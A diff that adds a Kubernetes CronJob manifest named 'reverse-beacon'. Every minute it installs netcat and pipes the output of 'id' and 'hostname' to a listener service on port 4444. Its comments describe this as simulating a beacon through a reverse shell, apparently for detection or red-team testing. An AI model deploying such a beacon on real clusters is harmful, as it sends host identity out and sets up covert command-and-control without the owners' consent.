@@ -1,0 +1,29 @@
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: reverse-beacon
+  labels:
+    app: reverse-beacon
+spec:
+  # Run every minute to simulate a frequent beacon
+  schedule: "* * * * *"
+  successfulJobsHistoryLimit: 3
+  failedJobsHistoryLimit: 1
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        metadata:
+          labels:
+            app: reverse-beacon
+        spec:
+          restartPolicy: Never
+          containers:
+            - name: beacon
+              image: alpine:latest
+              command: ["/bin/sh", "-c"]
+              args:
+                - |
+                  apk add --no-cache netcat-openbsd 2>/dev/null
+                  # Send identity info through the reverse shell then exit
+                  (id; hostname) | nc -w 5 beacon-listener.default.svc.cluster.local 4444 || true
